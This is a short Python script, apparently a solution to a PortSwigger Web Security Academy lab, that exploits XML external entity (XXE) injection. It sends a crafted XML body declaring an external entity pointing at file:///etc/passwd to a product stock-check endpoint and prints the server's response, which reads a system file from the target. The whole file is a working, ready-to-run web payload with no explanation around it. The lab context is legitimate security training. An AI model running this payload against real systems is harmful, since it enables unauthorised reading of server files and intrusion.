import requests
import sys

# Lab: Exploiting XXE to retrieve files:
# https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

url = sys.argv[1]

xml = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>"""

r = requests.post(url+"/product/stock/", data=xml, headers={'Content-Type': 'application/xml'})
print(r.text)
print("[+] Done!")
